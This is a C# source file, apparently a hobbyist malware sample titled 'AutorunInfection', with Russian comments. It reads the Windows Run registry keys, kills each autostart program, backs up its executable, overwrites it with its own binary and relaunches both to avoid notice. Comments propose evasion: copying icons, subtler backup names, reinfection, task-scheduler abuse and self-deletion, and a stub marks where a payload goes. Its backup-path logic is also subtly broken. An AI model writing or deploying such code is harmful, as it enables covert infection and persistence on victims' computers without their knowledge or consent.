using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace AutorunInfection
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Autorun Infection created r3xq1";
            string currentExePath = Process.GetCurrentProcess().MainModule.FileName; // получаем путь к текущему исполняемому файлу
            string currentDir = Path.GetDirectoryName(currentExePath); // получаем директорию текущего исполняемого файла
            string sourceApp = currentExePath; // путь к исполняемому файлу, который будет использоваться для заражения

            // Получаем список автозагрузочных приложений
            List<string> autorunFiles = GetAutorunFiles();

            // Проверяем, есть ли вообще что-то в автозагрузке
            if (autorunFiles.Count == 0)
            {
                Console.WriteLine("Нет исполняемых файлов в автозагрузке.");
                return;
            }

            // Проверяем, есть ли рядом _bak.exe
            string backupFile = FindBackupFile(currentDir);
            if (!string.IsNullOrEmpty(backupFile))
            {
                Console.WriteLine("Обнаружена резервная копия. Выполняем основные действия.");
                RunMainLogic();
                return;
            }

            // Ищем подходящее приложение для заражения
            foreach (var targetFilePath in autorunFiles)
            {
                string dir = Path.GetDirectoryName(targetFilePath); // получаем директорию целевого файла
                string filename = Path.GetFileName(targetFilePath); // получаем имя целевого файла
                string bakPath = Path.Combine(dir, Path.GetFileNameWithoutExtension(filename), "_bak.exe"); // создаем путь для резервной копии

                // Проверяем, не заражено ли оно уже
                if (File.Exists(bakPath)) continue;

                Console.WriteLine($"Заражаем: {targetFilePath}");

                // Останавливаем процесс, если запущен
                KillProcessIfRunning(targetFilePath);

                // Сохраняем оригинальный файл
                File.Copy(targetFilePath, bakPath);
                Console.WriteLine($"Создана резервная копия: {bakPath}");

                // Заменяем целевой файл собой
                File.Copy(sourceApp, targetFilePath, true);
                Console.WriteLine($"Файл заменён: {targetFilePath}");

                // Дополнительно можно добавить замену свойства файла и иконки как у оригинального файла (который бэкапнули)
                // Логику можно развивать или чтобы не было слишком палевно просто у оригинала сделать не _bak.exe а изменить одну буку файла.
                // Таким образом можно перезаражать каждый раз файлы из реестра если есть новые данные в реестре автозагрузки. 
                // По такому же принципу можно работать и с планировщиком задач.

                // Перезапускаем скопированный файл

                Process.Start(targetFilePath); // Запускаем наш файл
                Process.Start(bakPath); // Запускаем оригинальный файл для беспалевности

                // тут можно добавить самоудаление файла после всех действий, пока стоит обычное завершение  Environment.Exit(0);

                // Завершаем текущий процесс только после успешного запуска
                Environment.Exit(0);          
            }

            Console.WriteLine("Не удалось заразить ни один файл.");
            Console.ReadLine();
        }

        /// <summary>
        /// Проверяем наличие резервной копии в текущей директории
        /// </summary>
        private static string FindBackupFile(string directory)
        {
            try
            {
                // Ищем файлы с суффиксом _bak.exe в указанной директории
                foreach (var file in Directory.GetFiles(directory, "*_bak.exe"))
                {
                    // Проверяем, существует ли файл
                    if (File.Exists(file))
                    {
                        Console.WriteLine($"Обнаружен файл резервной копии: {file}");
                        return file;
                    }
                }
            }
            catch { }
            return null;
        }

        /// <summary>
        /// Останавливает процесс по имени файла
        /// </summary>
        private static void KillProcessIfRunning(string filePath)
        {
            string processName = Path.GetFileNameWithoutExtension(filePath); // получаем имя процесса без расширения
            Process[] processes = Process.GetProcessesByName(processName); // получаем процессы с этим именем
            foreach (Process p in processes) // перебираем все найденные процессы
            {
                Console.WriteLine($"Завершаем процесс: {p.ProcessName} (ID: {p.Id})");
                try
                {
                    p.Kill(); // Завершаем процесс
                    p.WaitForExit(); // Ждем завершения процесса
                }
                catch { }
            }
        }

        /// <summary>
        /// Получает список исполняемых файлов из автозагрузки
        /// </summary>
        private static List<string> GetAutorunFiles()
        {
            string subKey = @"Software\Microsoft\Windows\CurrentVersion\Run"; // ключ реестра для автозагрузки
            List<string> files = new List<string>(); // список для хранения найденных файлов

            foreach (var key in new[] { Registry.CurrentUser, Registry.LocalMachine }) // перебираем ключи реестра
            {
                using (RegistryKey rk = key.OpenSubKey(subKey)) // открываем ключ реестра
                {
                    if (rk == null) continue; // если ключ не найден, пропускаем

                    foreach (string valueName in rk.GetValueNames()) // перебираем все значения в ключе
                    {
                        string filePath = rk.GetValue(valueName)?.ToString(); // получаем значение по имени
                        if (string.IsNullOrWhiteSpace(filePath)) continue; // если значение пустое, пропускаем

                        filePath = filePath.Trim('"'); // убираем кавычки вокруг пути
                        if (filePath.EndsWith(".exe") && File.Exists(filePath)) // проверяем, что это исполняемый файл и он существует
                        {
                            files.Add(filePath); // добавляем файл в список
                        }
                    }
                }
            }

            return files;
        }

        /// <summary>
        /// Здесь выполняется основная полезная нагрузка
        /// </summary>
        private static void RunMainLogic()
        {
            Console.WriteLine("Основной код полезной нагрузки...");
            // Тут прописываем основную логику, которую нужно выполнить
            Console.ReadLine();
        }
    }
}
